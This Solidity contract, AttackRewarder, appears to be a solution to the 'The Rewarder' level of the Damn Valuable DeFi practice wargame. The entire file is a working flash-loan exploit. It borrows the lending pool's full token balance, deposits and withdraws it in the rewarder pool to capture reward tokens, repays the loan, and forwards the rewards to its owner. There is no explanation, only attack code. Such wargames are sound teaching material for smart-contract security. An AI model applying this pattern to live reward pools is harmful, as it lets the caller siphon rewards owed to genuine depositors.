// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract AttackRewarder{

    FlashLoanerPool public flashPool;
    TheRewarderPool public pool;
    RewardToken public rewardToken;
    DamnValuableToken public dvtToken;
    address private owner;

    constructor(address _flashPool,address _pool,address _rewardToken,address _dvtToken){
        flashPool = FlashLoanerPool(_flashPool);
        pool = TheRewarderPool(_pool);
        rewardToken = RewardToken(_rewardToken);
        dvtToken = DamnValuableToken(_dvtToken);
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external payable{
        
        dvtToken.approve(address(pool),amount);
        pool.deposit(amount);
        pool.withdraw(amount);

        bool success = dvtToken.transfer(address(flashPool),amount);
        require(success,"Couldnt pay back the amount to flashpool");
        
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner,rewardBalance);
    }

    function attack() public {
        uint256 amount = dvtToken.balanceOf(address(flashPool));
        flashPool.flashLoan(amount);
    }

}